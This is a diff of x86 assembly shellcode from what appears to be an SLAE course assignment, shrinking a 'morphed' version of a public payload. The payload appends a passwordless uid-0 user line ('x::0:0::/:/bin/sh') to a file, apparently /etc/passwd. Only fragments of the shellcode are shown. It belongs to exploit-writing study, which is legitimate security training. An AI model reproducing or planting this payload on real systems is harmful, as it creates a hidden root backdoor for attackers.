@@ -1,7 +1,7 @@
 ; SLAE Assignment 6: Append Passwd (morphed)
 ; http://shell-storm.org/shellcode/files/shellcode-561.php
 ; Original Shellcode Length:	107 
-; Morphed Shellcode Length:		82
+; Morphed Shellcode Length:		74
 
 global _start
 section .text
@@ -29,9 +29,9 @@ append:
 	xchg eax, ebx 				; fd 
 	push byte 0x4 				; #define __NR_write 4
 	pop eax 					; ssize_t write(int fd, const void *buf, size_t count);
-	mov ecx, esi 				; *buf -> toor::0:0::/root:/bin/sh
-	push byte 0x19 				; length = 25 bytes
-	pop edx 					; count = 25
+	mov ecx, esi 				; *buf -> x::0:0::/:/bin/sh
+	push byte 0x11 				; length = 17 bytes
+	pop edx 					; count = 17
 	int 0x80 					; write
 
 	push byte 0x1 				; #define __NR_exit 1
@@ -40,5 +40,4 @@ append:
 
 stage:
 	call append
-	usr: db "toor::0:0::/root:/bin/shC"
-
+	usr: db "x::0:0::/:/bin/sh"
